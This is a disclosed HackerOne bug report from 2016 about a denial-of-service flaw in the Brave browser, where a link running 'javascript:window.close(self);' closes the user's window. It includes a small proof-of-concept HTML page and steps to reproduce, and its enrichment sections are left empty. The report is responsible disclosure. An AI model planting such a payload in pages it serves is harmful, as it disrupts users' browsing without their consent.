---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '176197'
original_report_id: '176197'
title: Denial of service attack(window object) on brave browser
weakness: Uncontrolled Resource Consumption
team_handle: brave
created_at: '2016-10-16T21:31:08.926Z'
disclosed_at: '2016-10-25T21:41:30.064Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Denial of service attack(window object) on brave browser

## Metadata

- HackerOne Report ID: 176197
- Weakness: Uncontrolled Resource Consumption
- Program: brave
- Disclosed At: 2016-10-25T21:41:30.064Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
hey there,

The Brave browser is vulnerable to window object based denial of
service attack. The brave browser fails to sanitize a check when window.close()
function is called in number of dynamically generated events.. The
function is called in a suppressed manner and kills the parent window
directly by default which makes it vulnerable to denial of service attack.

When an attacker sends an html file to victim :-

<html>
<title>Brave Window Object  Remote Denial of Service.</title>
<head></head>
 
<body><br><br>
<h1><center>Brave Window Object  Remote Denial of Service</center></h1><br><br>
<h2><center>Proof of Concept</center></br></br> </h2>
 
 
<center>
<b>Click the  below link to Trigger the Vulnerability..</b><br><br>
<hr></hr>
 
<hr></hr>
<b><center><a href="javascript:window.close(self);">Brave  Window Object  DoS Test POC</a></center>
 
</center>
</body>
 
 
</html>

Here window.close() method should be sanitized and should not close the current window.I tested it in Firefox and chrome(Linux platform) and this widow object is validated there and current window doesn't close.
 
This security issue is a result of design flaw in the browser.Scripts must not close windows that were not opened by script,if script specific code is designed.
There must be a parent window confirmation check prior to close of window.
 

## Products affected: 

Latest Brave browser in Linux(Kali Linux)

## Steps To Reproduce:

1 Open the HTML file in brave browser in your Linux platform
2 click on the link provided 
3 You will see the current window i.e. the window in which the HTML file was opened closes.

## Supporting Material/References:

I have added a video POC and the html file.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
